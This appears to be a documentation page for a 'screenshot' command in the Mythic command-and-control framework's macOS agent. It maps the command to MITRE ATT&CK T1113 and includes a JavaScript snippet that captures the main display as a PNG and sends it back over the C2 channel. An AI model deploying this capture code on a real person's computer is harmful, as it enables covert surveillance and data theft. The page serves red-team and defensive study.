+++
title = "screenshot"
chapter = false
weight = 100
hidden = false
+++

## Summary

Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. 
- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

## Usage

```
screenshot
```

## MITRE ATT&CK Mapping

- T1113  
## Detailed Summary
This uses API calls to read the current screen the return it to Mythic. This doesn't currently capture _all_ screens though.
```JavaScript
let cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
if(cgimage.js === undefined) {
    cgimage = $.CFMakeCollectable(cgimage); // in case 10.15 is messing with the types again
}
if(cgimage.js === undefined){
  return {"user_output":"Failed to get image from display", "completed": true, "status": "error"};
}
let bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
let capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
```
The screencapture is chunked and sent back to Mythic.

>**NOTE** With 10.15, there are protections against this, so be careful

